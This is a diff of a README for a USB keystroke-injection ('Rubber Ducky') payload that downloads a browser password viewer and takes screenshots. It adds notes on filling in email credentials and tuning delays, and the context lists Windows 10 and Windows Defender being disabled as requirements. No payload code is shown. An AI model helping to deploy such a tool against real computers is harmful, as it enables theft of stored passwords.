@@ -3,6 +3,10 @@ Rubber ducky payload that downloads WebBrowserPasswordView file and screenshots 
 
 Note:
 
+Make sure to change all of the email placeholders to your email credentials or it will not work!
+
+Feel free to toy around with the delay times as this might be too fast for some slow computers
+
 This payload will only work IF:
   * The pc is running on windows 10
   * Windows Defender is disabled
